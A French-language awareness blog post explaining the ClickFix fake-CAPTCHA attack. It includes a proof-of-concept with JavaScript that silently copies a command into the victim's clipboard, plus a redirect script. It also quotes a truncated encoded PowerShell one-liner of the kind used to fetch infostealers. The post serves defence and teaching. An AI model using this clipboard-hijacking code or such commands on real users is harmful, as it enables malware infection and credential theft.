---
title: "ClickFix — Quand un faux CAPTCHA compromet votre machine"
date: 2026-02-26
description: "Article de sensibilisation sur la technique d'ingénierie sociale ClickFix : faux CAPTCHA, clipboard hijacking et exécution de commandes malveillantes. Démonstration avec un PoC maison."
tags:
  - Sensibilisation
  - ClickFix
  - Social Engineering
  - CAPTCHA
  - Malware
  - Phishing
  - Clipboard Hijacking
categories:
  - Sensibilisation
draft: false
---

## Introduction

Depuis début 2024, une technique d'ingénierie sociale est de plus en plus utilisée  : **ClickFix**. Le principe est simple. Un faux CAPTCHA vous demande de "prouver que vous n'êtes pas un robot" et vous fait exécuter une commande malveillante sur votre propre machine. Aucune vulnérabilité technique n'est exploitée. La seule faille, c'est l'utilisateur.

Des groupes cybercriminels l'utilisent pour distribuer des infostealers (Lumma Stealer, StealC, DarkGate), mais aussi des acteurs étatiques comme APT28 (Russie), MuddyWater (Iran) ou Lazarus (Corée du Nord). 

En 2025, Microsoft estimait que des milliers de machines étaient compromises **chaque mois** par cette méthode, même dans des environnements avec EDR.

Pour illustrer cette menace, nous allons voir un **Proof of Concept** qui reproduit l'attaque en usurpant un flux vers mon site.

---

## Comment fonctionne ClickFix ?

### Le scénario classique

L'attaque se déroule en quatre étapes. Toutes reposent sur la confiance de l'utilisateur envers les mécanismes de vérification qu'il croise tous les jours sur le web.

**1. L'appât** : la victime arrive sur une page web qui affiche un faux CAPTCHA. La page peut être un site compromis, une page de phishing, ou même un résultat publicitaire malveillant. L'interface imite Google reCAPTCHA ou Cloudflare Turnstile à la perfection.

**2. Le piège** : quand l'utilisateur clique sur "Je ne suis pas un robot", un script JavaScript copie en silence une commande malveillante dans son presse-papiers. L'utilisateur ne voit rien, ne reçoit aucune alerte.

**3. L'exécution** : une popup s'affiche avec des instructions de "vérification" qui semblent légitimes. On lui demande d'appuyer sur `Win + R`, puis `Ctrl + V`, puis `Entrée`. L'utilisateur suit les étapes sans réfléchir et vient de coller puis exécuter la commande malveillante.

**4. La compromission** : la commande télécharge et exécute un payload qui installe un malware en mémoire. Pas de fichier sur le disque, pas d'alerte du navigateur.

### Pourquoi ça marche aussi bien ?

Plusieurs facteurs expliquent le succès de ClickFix :

- **Familiarité** : tout le monde a déjà résolu un CAPTCHA. L'interface est connue et n'éveille aucun soupçon.
- **Bypass des protections** : le navigateur ne déclenche aucun téléchargement. Aucun fichier n'est exécuté depuis le web. L'utilisateur lance lui-même la commande, ce qui échappe à Safe Browsing et SmartScreen.
- **Simplicité psychologique** : les trois étapes demandées (`Win+R`, `Ctrl+V`, `Entrée`) paraissent anodines. Personne ne soupçonne un CAPTCHA de faire exécuter quelque chose de dangereux.

---

## Démonstration : Le PoC

### Étape 1 : le faux CAPTCHA

L'utilisateur arrive sur une page qui bloque l'accès au site. Elle affiche un reCAPTCHA Google avec le message *"Nos systèmes ont détecté un trafic exceptionnel sur votre réseau informatique"*. C'est un message que l'on retrouve réellement chez Google, ce qui renforce la crédibilité du piège.

![ClickFix : faux CAPTCHA](/images/clickfix-fake-captcha.png)

### Étape 2 : les instructions de "vérification"

Quand l'utilisateur interagit avec le CAPTCHA, une popup lui demande de suivre des "étapes de vérification" :

1. Appuyer sur `Windows + R`
2. Appuyer sur `Ctrl + V`
3. Appuyer sur `Entrée`

En arrière-plan, le JavaScript a déjà copié la commande malveillante dans le presse-papiers.

![ClickFix : popup d'instructions](/images/clickfix-verification-steps.png)

### Étape 3 : l'exécution involontaire

Si l'utilisateur suit les instructions, la boîte de dialogue "Exécuter" de Windows s'ouvre et la commande malveillante est automatiquement collée, prête à être lancée.

![ClickFix : commande collée dans Exécuter](/images/clickfix-run-dialog.png)

Dans mon PoC, la commande est un simple `curl -X POST http://localhost:8000/install` qui appelle un serveur local. En vrai, ce serait un script PowerShell encodé qui télécharge et exécute un infostealer en mémoire.

### Le code derrière le piège

Voici le mécanisme de **clipboard hijacking** du PoC. Quand l'utilisateur clique sur le CAPTCHA, ce code copie la commande dans son presse-papiers sans qu'il le sache :

```javascript
const textToCopy = `curl -X POST http://localhost:8000/install`;

if (navigator.clipboard && window.isSecureContext) {
    navigator.clipboard.writeText(textToCopy)
        .then(() => console.log("Texte copié !"))
        .catch(err => console.error("Erreur lors de la copie : ", err));
} else {
    const tempTextArea = document.createElement("textarea");
    tempTextArea.value = textToCopy;
    tempTextArea.style.position = "fixed";
    document.body.appendChild(tempTextArea);
    tempTextArea.focus();
    tempTextArea.select();
    document.execCommand("copy");
    document.body.removeChild(tempTextArea);
}
```

Le script utilise l'API `navigator.clipboard` en priorité (contexte HTTPS), avec un fallback via un `<textarea>` caché pour les environnements où l'API n'est pas disponible. L'utilisateur ne reçoit aucune notification.

Un second script vérifie en boucle si la commande a été exécutée, puis redirige vers le vrai site :

```javascript
async function checkInstallStatus() {
    try {
        const res = await fetch('/status');
        const data = await res.json();
        if (data.install_triggered) {
            window.location.href = "https://chic0s.fr/";
        }
    } catch (e) {
        console.error("Erreur en vérifiant le status :", e);
    }
}
setInterval(checkInstallStatus, 1000);
```

Cette redirection vers le site légitime après l'exécution renforce l'illusion. L'utilisateur pense que le CAPTCHA a fonctionné et navigue normalement, sans savoir que sa machine est compromise.

---

## En conditions réelles

Dans les campagnes observées en 2025-2026, la commande copiée dans le presse-papiers n'est pas un simple `curl`. Elle ressemble plutôt à ça :

```powershell
powershell -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...
```

Ce one-liner PowerShell encodé en Base64 va :

1. Télécharger un loader depuis un serveur distant
2. Injecter le payload directement en mémoire (fileless)
3. Installer un infostealer (Lumma Stealer, StealC, etc.) qui exfiltre les mots de passe, cookies, wallets crypto et tokens de session
4. Mettre en place une persistance via des tâches planifiées déguisées

Il existe de nombreuses variantes de ClickFix : **CrashFix**, **ConsentFix**, **PhantomCaptcha**, **GlitchFix**. Certaines ne simulent pas un CAPTCHA mais un message d'erreur du navigateur, un problème d'affichage de police, ou une mise à jour requise.

---

## Conclusion

ClickFix rappelle que la sécurité ne se résume pas à des patchs et des firewalls. La technique n'exploite aucune faille logicielle. Elle exploite la confiance et les habitudes des utilisateurs. 

La meilleure défense reste la sensibilisation : savoir qu'un CAPTCHA ne vous demandera jamais d'exécuter une commande, c'est déjà se protéger contre 100% des campagnes ClickFix.